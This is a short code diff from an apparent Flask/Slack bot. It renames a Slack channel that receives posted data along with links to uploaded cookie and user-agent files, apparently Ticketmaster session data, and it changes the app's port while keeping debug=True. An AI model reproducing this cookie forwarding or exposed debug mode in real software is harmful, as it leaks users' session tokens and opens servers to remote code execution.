@@ -50,10 +50,10 @@ def send_to_group_channel(data, cookies, ua):
     user_url = user_file.get("file").get("permalink")
     
     client.chat_postMessage(
-        channel="#ticketmaster_notifications_temp",
+        channel="#real-bot",
         text=f"{data}\n*User-Agent:* {user_url}\n*Cookie:* {cookie_url}",
         parse="mrkdwn"
     )
 
 if __name__ == '__main__':
-    app.run(debug=True, port=80)
+    app.run(debug=True, port=8080)
